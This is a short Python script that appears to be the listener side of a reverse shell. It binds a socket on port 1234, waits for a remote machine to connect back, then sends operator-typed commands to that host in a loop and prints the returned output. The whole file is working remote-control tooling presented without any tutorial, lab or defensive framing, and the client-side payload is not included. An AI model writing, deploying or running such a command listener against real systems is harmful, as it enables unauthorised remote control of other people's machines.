import socket


def connection():
	global conn
	ip = '0.0.0.0'
	port = 1234
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
	s.bind((ip, port))
	s.listen(1)
	print('[+] Waiting for incoming connections...')
	conn, addr = s.accept()
	print('[+] Connected to', addr)
	print('[+] type exec before command if there is no output to your command')


def shell_commands():
	while True:
		command = input("Shell>>")
		if command == 'exit':
			conn.send(b'exit')
			print('[+] Exiting...')
			conn.close()
			break
		elif 'exec' in command:
			conn.send(command.encode())
		else:
			conn.send(command.encode())
			output = conn.recv(1024)
			print(output)


connection()
shell_commands()
